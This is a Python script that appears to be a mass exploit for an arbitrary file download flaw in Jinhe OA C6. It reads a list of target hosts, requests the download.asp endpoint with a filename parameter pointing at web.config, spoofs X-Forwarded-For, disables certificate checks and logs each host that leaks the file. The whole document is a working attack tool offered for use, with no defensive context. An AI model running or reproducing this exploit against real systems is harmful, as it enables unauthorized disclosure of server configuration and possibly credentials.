import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def getres(target):
	headers={
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
	'Accept-Encoding': 'gzip, deflate',
	'X-Forwarded-For': '8.8.8.8',
	'Connection': 'close',
	'Upgrade-Insecure-Requests': '1',
	'Content-Type': 'application/x-www-form-urlencoded',
	}
	try:
		url=target+'/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config'
		res=requests.get(url=url,headers=headers,verify=False,timeout=2)
		#print(res)
		if res.status_code == 200 and 'httpModules' in res.text:
			save('jhoa_success.txt',url)
			print(url,'-------------->')
		else:
			print(url)
	except Exception as e:
		pass

def save(fname,mystr):
	try:
		ff=open(fname,'a')
		ff.write(mystr+'\n')
	except Exception as e:
		pass
	finally:
		ff.close()

if __name__ == '__main__':
	f=open('jhoa.txt','r')
	for target in f.readlines():
		if 'http' not in target:
			target='http://'+target.strip('\n')
		getres(target.strip('\n').strip())